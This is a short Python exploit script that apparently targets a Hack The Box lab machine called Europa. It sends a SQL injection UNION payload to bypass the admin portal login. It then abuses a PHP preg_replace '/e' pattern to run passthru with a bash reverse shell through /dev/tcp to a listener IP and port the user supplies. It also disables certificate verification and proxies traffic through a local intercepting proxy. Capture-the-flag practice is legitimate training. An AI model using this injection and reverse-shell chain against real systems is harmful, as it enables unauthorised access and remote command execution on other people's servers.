# europa rev shell
import requests
import urllib3
import sys

#disable ssl warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# s.post(..verify=False...)

if len(sys.argv) < 2:
	print("(+) usage: <your_listening_ip> <your_listening_port>")
	sys.exit(-1)

lhost=sys.argv[1]
lport=sys.argv[2]

print(lport)
print(lhost)

s=requests.session()

proxies= { 'https':'http://127.0.0.1:8080' } 

#headers=

data={
	'email':'dTVD\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#',
	'password':''
}

r=s.post("https://admin-portal.europacorp.htb/login.php", data=data, allow_redirects=True,verify=False, proxies=proxies)

#print(r.status_code)

data = { 
	'pattern':'/asd/e',
	'ipaddress':'passthru("/bin/bash -c \'bash -i >& /dev/tcp/'+lhost+'/'+lport+' 0>&1\'")',
	'text':'asd'
}
r=s.post("https://admin-portal.europacorp.htb/tools.php", data=data, verify=False)
print("rev shell inc")
